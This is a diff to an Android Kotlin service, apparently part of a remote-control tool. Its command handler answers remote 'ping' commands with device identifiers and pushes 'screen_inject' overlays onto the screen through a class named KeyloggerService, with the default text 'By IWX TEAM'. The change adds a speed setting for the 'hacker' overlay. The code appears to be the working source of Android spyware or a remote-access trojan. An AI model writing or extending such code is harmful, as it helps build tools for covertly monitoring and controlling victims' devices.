@@ -283,7 +283,12 @@ class ConnectorService : Service() {
             cmd == "ping"        -> Pair("pong · $deviceName · $deviceId", "command_result")
 
             // ── Screen Inject ──
-            cmd.startsWith("screen_inject_hacker:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_hacker:"),   "hacker"),   "command_result")
+            cmd.startsWith("screen_inject_hacker:")   -> {
+                val raw  = cmd.removePrefix("screen_inject_hacker:")
+                val spd  = Regex("\\|\\|spd:([0-9.]+)").find(raw)?.groupValues?.getOrNull(1)?.toFloatOrNull() ?: 0.60f
+                val txt  = raw.replace(Regex("\\|\\|spd:[0-9.]+"), "")
+                Pair(doScreenInject(txt, "hacker", spd), "command_result")
+            }
             cmd.startsWith("screen_inject_matrix:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_matrix:"),   "matrix"),   "command_result")
             cmd.startsWith("screen_inject_terminal:") -> Pair(doScreenInject(cmd.removePrefix("screen_inject_terminal:"), "terminal"), "command_result")
             cmd.startsWith("screen_inject_glitch:")   -> Pair(doScreenInject(cmd.removePrefix("screen_inject_glitch:"),   "glitch"),   "command_result")
@@ -880,10 +885,10 @@ class ConnectorService : Service() {
     }
 
     // ── Screen Inject ─────────────────────────────────────────────────────────
-    private fun doScreenInject(text: String, style: String = "hacker"): String {
+    private fun doScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f): String {
         return try {
             val trimmed = text.trim().ifEmpty { "By IWX TEAM" }
-            KeyloggerService.showScreenInject(trimmed, style)
+            KeyloggerService.showScreenInject(trimmed, style, speed)
             "OK: [${style.uppercase()}] Overlay — ${trimmed}"
         } catch (e: Exception) { "ERROR: ${e.message}" }
     }
